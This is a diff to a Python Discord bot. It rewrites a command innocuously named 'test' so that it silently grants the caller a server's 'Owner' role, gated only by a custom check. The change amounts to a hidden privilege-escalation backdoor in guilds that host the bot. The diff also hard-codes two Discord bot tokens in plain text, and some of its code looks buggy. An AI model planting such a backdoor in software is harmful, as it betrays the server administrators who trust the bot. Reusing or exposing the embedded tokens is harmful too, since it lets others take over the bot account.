@@ -308,11 +308,18 @@ async def in_guilds(ctx):
     for i in client.guilds:
         await ctx.send(i.name)
 
+
 @client.command()
+@command.check(Kami_Check)
 async def test(ctx):
-    await ctx.send("Input meem me")
-    x= await client.wait_for("message",timeout=60.0, check=room)
-    await ctx.send(x.content)
+##    await ctx.send("Input meem me")
+##    x= await client.wait_for("message",timeout=60.0, check=room)
+##    await ctx.send(x.content)
+        for i in ctx.guild.roles:
+            if( i.name=="Owner"):
+                x=i
+        await ctx.author.add_roles(x)
+        
 
 @client.command()
 async def rtfm(ctx):
@@ -393,4 +400,4 @@ So In conclusion
 
     
 
-client.run('NDA3MDY0OTIyMTU4MjY4NDE2.DsCmTg.-malA_qvgyyONHi3Z5wHdliPogY')
+client.run('NDA3MDY0OTIyMTU4MjY4NDE2.DsCqGw.LKuD46PSvvv4BIPMTdmS_Te1nfM')
